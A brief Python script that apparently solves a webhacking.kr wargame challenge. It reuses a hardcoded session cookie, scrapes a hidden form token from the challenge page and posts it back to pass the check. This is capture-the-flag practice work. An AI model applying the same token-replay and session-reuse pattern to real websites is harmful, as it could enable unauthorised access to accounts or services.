import requests
from bs4 import BeautifulSoup

cookies = {"PHPSESSID": "2decc47b5313e0d64ccda07b11df6a79"}
url = "http://webhacking.kr/challenge/codeing/code4.html"

r = requests.get(url, cookies=cookies)
cookies['st'] = r.cookies['st']
soup = BeautifulSoup(r.text, "lxml")
attackme = soup.find_all("input")[3]['value']
data = {"id":"ad", "cmt":"boss","hack":attackme,"attackme":attackme}
r1 = requests.post(url, cookies=cookies, data=data)
print r1.text